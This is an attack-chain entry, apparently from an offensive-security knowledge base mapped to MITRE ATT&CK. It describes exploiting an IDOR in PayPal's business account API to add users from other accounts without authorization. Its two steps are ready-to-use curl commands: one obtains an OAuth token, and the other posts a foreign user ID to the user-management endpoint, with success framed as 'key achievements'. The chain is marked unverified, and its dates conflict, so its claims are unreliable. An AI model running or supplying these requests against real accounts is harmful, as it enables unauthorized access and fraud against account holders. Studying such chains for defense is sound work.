---
tags:
  - idor
  - api
  - paypal
  - account-manipulation
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
commands: []
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Authenticate-to-PayPal-Business-API]]'
  - '[[procedures/Exploit-IDOR-to-Add-Secondary-User]]'
step_count: 2
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
description: >-
  Exploitation of an Insecure Direct Object Reference vulnerability in PayPal's
  business account API to add secondary users without authorization
skill_level: intermediate
impact_level: medium
id: 1f3f0e8d-7a06-4918-99fb-51bbb8de908e
created_at: '2025-12-11T03:47:39.699Z'
updated_at: '2025-12-11T03:47:39.699Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1078]]'
  - '[[T1098]]'
---
# IDOR in PayPal API to Add Unauthorized Secondary Users

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in PayPal's business account management API, allowing unauthorized addition of secondary users from other accounts, potentially granting access to sensitive functions.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access] --> B[Account Manipulation]
    B --> C[Unauthorized Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- #curl

### Target Environment

- Web-based API
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to PayPal API

### Initial Access Requirements

- Valid PayPal business account credentials
- Network position: External attacker
- Prior access needed: Authenticated session

## Detailed Attack Procedures

## Step 1: Authenticate to PayPal Business API - [[procedures/Authenticate-to-PayPal-Business-API]]

**Procedure**: [[procedures/Authenticate-to-PayPal-Business-API]]

**Objective**: Obtain an authenticated session as a business account owner to access the user management endpoint.

**Expected Output**: Successful authentication token or session cookie.

**Success Indicators**:
- Receipt of valid auth token
- Ability to access protected endpoints

First, authenticate using [[commands/curl-api-auth]]:

```bash
curl -X POST 'https://api.paypal.com/v1/oauth2/token' \
  -H 'Authorization: Basic <client_id:client_secret>' \
  -d 'grant_type=client_credentials'
```

Verify the response contains an access token.

## Step 2: Exploit IDOR to Add Secondary User - [[procedures/Exploit-IDOR-to-Add-Secondary-User]]

**Procedure**: [[procedures/Exploit-IDOR-to-Add-Secondary-User]]

**Objective**: Use the IDOR vulnerability to add a secondary user from another account without proper authorization checks.

**Expected Output**: Successful addition of the unauthorized user to the business account.

**Success Indicators**:
- User added confirmation in API response
- Unauthorized access granted to the added user's functions

Exploit the endpoint using [[commands/curl-idor-exploit]]:

```bash
curl -X POST 'https://www.paypal.com/businessmanage/users/api/v1/users' \
  -H 'Authorization: Bearer <access_token>' \
  -H 'Content-Type: application/json' \
  -d '{"user_id": "<target_user_id_from_other_account>", "role": "secondary"}'
```

Check the response for success and attempt to access functions with the added user.

## Attack Chain Summary

### Key Achievements

1. Gained authenticated access to PayPal business API
2. Exploited IDOR to manipulate account users
3. Potentially achieved unauthorized access to account functions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]]
- [[Account Manipulation]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Persistence]]

*Last updated: 2023-10-01*
